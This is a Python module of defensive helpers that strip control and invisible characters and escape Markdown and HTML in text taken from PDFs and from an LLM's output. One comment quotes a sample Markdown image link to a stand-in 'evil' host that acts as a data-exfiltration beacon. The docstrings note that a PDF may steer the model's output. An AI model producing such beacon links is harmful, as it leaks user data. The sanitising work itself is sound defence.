from __future__ import annotations

import re
import unicodedata

# Unicode categories removed from any text coming from a PDF or from the LLM:
#   Cc = control chars (NUL, ESC, \r, \n...), Cf = invisible formatting chars
#   (zero-width, and bidi overrides U+202E used to visually spoof a name — "Trojan Source").
_STRIPPED_CATEGORIES = frozenset({"Cc", "Cf"})
_WHITESPACE_RUN = re.compile(r"\s+")
# Characters that Markdown / HTML renderers interpret. A supplier name such as
# "![x](http://evil/?d=..)" would otherwise render as an image = data-exfiltration beacon.
_MARKDOWN_SPECIAL = re.compile(r"([\\`*_{}\[\]()<>#+\-.!|~&])")


def clean_text(value: str, max_length: int) -> str:
    """Make an untrusted string safe to store, log and pass around.

    Removes control / invisible characters, collapses whitespace and truncates.
    It does NOT make the text safe to *display* — use `escape_markdown` for that.
    """
    kept = "".join(
        ch if ch.isspace() or unicodedata.category(ch) not in _STRIPPED_CATEGORIES else " "
        for ch in value
    )
    collapsed = _WHITESPACE_RUN.sub(" ", kept).strip()
    return collapsed[:max_length]


def escape_markdown(value: str) -> str:
    """Escape Markdown/HTML syntax so untrusted text is rendered literally.

    To be used by the UI (Streamlit `st.markdown`, exports) on every field that comes
    from the LLM — its output is untrusted, the PDF may have steered it.
    """
    return _MARKDOWN_SPECIAL.sub(r"\\\1", value)
